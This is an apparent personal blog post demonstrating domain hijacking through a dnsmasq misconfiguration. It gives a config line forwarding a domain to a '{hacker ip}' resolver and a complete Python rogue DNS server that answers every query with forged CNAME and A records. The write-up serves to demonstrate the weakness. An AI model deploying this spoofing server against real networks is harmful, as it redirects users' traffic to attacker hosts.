<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><meta name="author"><title>Arbitrary domain name hijacking caused by misconfiguration in dnsmasq · xchens</title><meta name="description" content="dnsmasq
Dnsmasq provides network infrastructure for small networks: DNS, DHCP, router advertisement and network boot. It is designed to be lightweight"><meta name="keywords"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="renderer" content="webkit"><link rel="short icon" href="/images/favicon.png" type="image/x-icon"><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="/css/table.css"><link rel="stylesheet" href="/css/blog_basic.css"><link rel="stylesheet" href="/css/font-awesome.min.css"><link rel="alternate" type="application/atom+xml" title="ATOM 1.0" href="/atom.xml"><meta name="generator" content="Hexo 5.4.0"></head><body><div class="sidebar animated fadeInDown"><div class="logo-title"><div class="title"><a href="/"><img src="/images/logo@2x.png" style="width:127px;"><h3 title=""><span>xchens</span></h3><div class="description"><p>share tech</p></div></a></div></div><ul class="social-links"></ul><div class="footer"><a target="_blank" href="https://github.com/cshsonice"><span>follow me on  </span><i class="fa fa-github"></i></a></div></div><div class="main"><div class="page-top animated fadeInDown"><div class="nav"><li><a href="/">home</a></li><li><a href="/about">about</a></li><li><a href="/archives">archive</a></li><li><a href="/links">links</a></li></div><div class="information"><div class="back_btn"><li><a class="fa fa-chevron-left" onclick="window.history.go(-1)"> </a></li></div><div class="avatar"><a href="/home" title="home"><img src="/images/avatar.jpg"></a></div></div></div><div class="autopagerize_page_element"><div class="content"><div class="post-page"><div class="post animated fadeInDown"><div class="post-title"><h3><a>Arbitrary domain name hijacking caused by misconfiguration in dnsmasq</a></h3></div><div class="post-content"><h1 id="dnsmasq"><a href="#dnsmasq" class="headerlink" title="dnsmasq"></a>dnsmasq</h1><blockquote>
<p>Dnsmasq provides network infrastructure for small networks: DNS, DHCP, router advertisement and network boot. It is designed to be lightweight and have a small footprint, suitable for resource constrained routers and firewalls. It has also been widely used for tethering on smartphones and portable hotspots, and to support virtual networking in virtualisation frameworks. Supported platforms include Linux (with glibc and uclibc), Android, *BSD, and Mac OS X. Dnsmasq is included in most Linux distributions and the ports systems of FreeBSD, OpenBSD and NetBSD. Dnsmasq provides full IPv6 support.  </p>
</blockquote>
<p><a target="_blank" rel="noopener" href="http://www.thekelleys.org.uk/dnsmasq/doc.html">dnsmasq homepage</a></p>
<h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><ol>
<li>add this config to <code>dnsmasq.conf</code> or <code>dnsmasq.d/poc.conf</code><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">server=/a.net/&#123;hacker ip&#125;</span><br></pre></td></tr></table></figure>
then restart the dnsmasq to activate this config.  </li>
</ol>
<ul>
<li>dnsmasq.conf is usually at /usr/local/etc/ if in mac os</li>
</ul>
<ol start="2">
<li>run this code in the {hacker ip} - <code>poc.py</code></li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> socket, AF_INET, SOCK_DGRAM</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dns</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="comment"># hdr</span></span><br><span class="line">        self.transactionID  = <span class="string">b&quot;\x00\x00&quot;</span> <span class="comment"># --</span></span><br><span class="line">        self.flags          = <span class="string">b&quot;\x81\x80&quot;</span></span><br><span class="line">        self.questionNum    = <span class="string">b&quot;\x00\x01&quot;</span></span><br><span class="line">        self.answerRR       = <span class="string">b&quot;\x00\x02&quot;</span></span><br><span class="line">        self.authorityRR    = <span class="string">b&quot;\x00\x00&quot;</span></span><br><span class="line">        self.additionalRR   = <span class="string">b&quot;\x00\x00&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># queries - only one we need</span></span><br><span class="line">        self.qname  = <span class="string">b&quot;\x01a\x03net\x00&quot;</span> <span class="comment"># -- 0x0c</span></span><br><span class="line">        self.qtype  = <span class="string">b&quot;\x00\x01&quot;</span></span><br><span class="line">        self.qclass = <span class="string">b&quot;\x00\x01&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># answers - CNAME</span></span><br><span class="line">        self.cnameName    = <span class="string">b&quot;\xc0\x0c&quot;</span></span><br><span class="line">        self.cnameType    = <span class="string">b&quot;\x00\x05&quot;</span></span><br><span class="line">        self.cnameClass   = <span class="string">b&quot;\x00\x01&quot;</span></span><br><span class="line">        self.cnameTtl     = <span class="string">b&quot;\x00\x00\x00\x20&quot;</span>  <span class="comment"># domain hijack duration</span></span><br><span class="line">        self.cnameDataLen = <span class="string">b&quot;\x00\x0d&quot;</span> <span class="comment"># --</span></span><br><span class="line">        self.cnameTarget  = <span class="string">b&quot;\x07example\x03net\x00&quot;</span>  <span class="comment"># --</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># answers - A</span></span><br><span class="line">        self.aName    = <span class="string">b&quot;\xc0\x19&quot;</span>  <span class="comment"># --</span></span><br><span class="line">        self.aType    = <span class="string">b&quot;\x00\x01&quot;</span></span><br><span class="line">        self.aCLass   = <span class="string">b&quot;\x00\x01&quot;</span></span><br><span class="line">        self.aTtl     = <span class="string">b&quot;\x00\x00\x00\x20&quot;</span>  <span class="comment"># domain hijack duration</span></span><br><span class="line">        self.aDataLen = <span class="string">b&quot;\x00\x04&quot;</span></span><br><span class="line">        self.aRecord  = <span class="string">b&quot;\x01\x02\x03\x04&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_setReply</span>(<span class="params">self, query: <span class="built_in">bytes</span></span>):</span></span><br><span class="line">        self.transactionID = query[:<span class="number">2</span>]</span><br><span class="line">        i = <span class="number">0x0c</span></span><br><span class="line">        <span class="keyword">while</span> i &lt; <span class="built_in">len</span>(query):</span><br><span class="line">            <span class="keyword">if</span> query[i] == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">        self.qname = query[<span class="number">0x0c</span>:i+<span class="number">1</span>]</span><br><span class="line">        self.aName = ((<span class="built_in">len</span>(self.qname) + <span class="number">28</span>) | <span class="number">0xc000</span>).to_bytes(<span class="number">2</span>, byteorder=<span class="string">&quot;big&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">build</span>(<span class="params">self, query: <span class="built_in">bytes</span></span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;build dns response to query&quot;&quot;&quot;</span></span><br><span class="line">        self._setReply(query)</span><br><span class="line">        <span class="comment"># build</span></span><br><span class="line">        hdr = self.transactionID + self.flags + self.questionNum + self.answerRR + self.authorityRR + self.additionalRR</span><br><span class="line">        query = self.qname + self.qtype + self.qclass</span><br><span class="line">        answerCNAME = self.cnameName + self.cnameType + self.cnameClass + self.cnameTtl + self.cnameDataLen + self.cnameTarget</span><br><span class="line">        answerA = self.aName + self.aType + self.aCLass + self.aTtl + self.aDataLen + self.aRecord</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> hdr + query + answerCNAME + answerA  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dns_server</span>(<span class="params">port: <span class="built_in">int</span></span>):</span></span><br><span class="line">    address = (<span class="string">&#x27;&#x27;</span>, port)</span><br><span class="line">    sock = socket(AF_INET, SOCK_DGRAM)</span><br><span class="line">    sock.bind(address)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Listen UDP on: &quot;</span>, port)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        msg, addr = sock.recvfrom(<span class="number">8192</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;recv from:&quot;</span>, addr)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(msg) &gt; <span class="number">20</span>:</span><br><span class="line">            d = dns()</span><br><span class="line">            data = d.build(msg)</span><br><span class="line">            sock.sendto(data, addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    port = <span class="number">53</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt; <span class="number">1</span> <span class="keyword">and</span> sys.argv[<span class="number">1</span>].isdigit():</span><br><span class="line">        port = <span class="built_in">int</span>(sys.argv[<span class="number">1</span>])</span><br><span class="line">    dns_server(port)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ol start="3">
<li>check hijack</li>
</ol>
<p><img src="https://xchens-1254410906.cos.ap-shanghai.myqcloud.com/assets/images/dnsmasq_poc.jpeg" alt="poc"></p>
</div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">update at 2020-09-09</span><i class="fa fa-tag"></i><a class="tag" href="/tags/dns/" title="dns">dns </a><a class="tag" href="/tags/dnsmasq/" title="dnsmasq">dnsmasq </a></div></div></div></div><div class="share"><div class="evernote"><a class="fa fa-bookmark" href="javascript:(function(){EN_CLIP_HOST='http://www.evernote.com';try{var%20x=document.createElement('SCRIPT');x.type='text/javascript';x.src=EN_CLIP_HOST+'/public/bookmarkClipper.js?'+(new%20Date().getTime()/100000);document.getElementsByTagName('head')[0].appendChild(x);}catch(e){location.href=EN_CLIP_HOST+'/clip.action?url='+encodeURIComponent(location.href)+'&amp;title='+encodeURIComponent(document.title);}})();" ref="nofollow" target="_blank"></a></div><div class="weibo"><a class="fa fa-weibo" href="javascript:void((function(s,d,e){try{}catch(e){}var f='http://service.weibo.com/share/share.php?',u=d.location.href,p=['url=',e(u),'&amp;title=',e(d.title),'&amp;appkey=2924220432'].join('');function a(){if(!window.open([f,p].join(''),'mb',['toolbar=0,status=0,resizable=1,width=620,height=450,left=',(s.width-620)/2,',top=',(s.height-450)/2].join('')))u.href=[f,p].join('');};if(/Firefox/.test(navigator.userAgent)){setTimeout(a,0)}else{a()}})(screen,document,encodeURIComponent));"></a></div><div class="twitter"><a class="fa fa-twitter" target="_blank" rel="noopener" href="http://twitter.com/home?status=,https://xchens.cn//posts/d8547337/,xchens,Arbitrary domain name hijacking caused by misconfiguration in dnsmasq,;"></a></div></div><div class="pagination"><ul class="clearfix"><li class="pre pagbuttons"><a class="btn" role="navigation" href="/posts/83eac405/" title="漫谈设计模式 1 - 观察者模式">previous post</a></li><li class="next pagbuttons"><a class="btn" role="navigation" href="/posts/fe4ef317/" title="linux常用命令">next post</a></li></ul></div><div id="remark42"></div></div></div></div></div><script src="/js/jquery.js"></script><script src="/js/jquery-migrate-1.2.1.min.js"></script><script src="/js/jquery.appear.js"></script><script async src="/js/customize.js"></script></body></html>